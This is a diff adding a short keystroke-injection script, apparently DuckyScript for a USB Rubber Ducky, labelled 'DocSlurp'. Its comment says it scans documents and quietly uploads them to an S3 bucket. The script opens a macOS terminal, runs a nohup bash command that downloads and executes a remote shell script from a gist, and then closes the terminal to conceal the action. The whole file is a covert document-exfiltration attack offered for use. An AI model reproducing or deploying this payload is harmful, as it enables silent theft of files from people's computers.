@@ -1,0 +1,14 @@
+REM @Thnkr
+REM DocSlurp - Script quickly scans documents and quietly uploads them to S3 bucket.
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 700
+ENTER
+DELAY 1000
+STRING nohup bash <(curl -s https://gist.githubusercontent.com/thnkr/374c91ff2d9df7a4a585/raw/docslurp.sh)
+DELAY 300
+ENTER
+DELAY 2000
+GUI q
